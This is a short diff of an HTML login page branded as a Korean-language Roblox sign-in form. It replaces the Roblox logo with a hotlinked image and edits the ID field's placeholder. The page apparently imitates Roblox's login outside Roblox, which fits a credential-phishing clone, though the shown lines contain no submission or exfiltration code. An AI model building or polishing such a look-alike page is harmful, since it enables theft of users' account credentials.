@@ -69,11 +69,11 @@
 
 <div id="main-content">
     <div class="login-box">
-        <img src="https://www.roblox.com" width="75" alt="Roblox" class="logo">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTkVFlvrIx0sjaqPAtE9oemabGfo48NvrQpQ4gongVK-imtkk8CUg&s=10&ec=121585071" width="75" alt="Roblox" class="logo">
         <h1>Roblox 로그인</h1>
         <p>Roblox 계정 사용</p>
         <div class="input-group">
-            <input type="text" id="email" placeholder="이메일 또는 휴대전화" required>
+            <input type="text" id="email" placeholder="아이디 입력" required>
         </div>
         <div class="input-group">
             <input type="password" id="password" placeholder="비밀번호 입력" required>
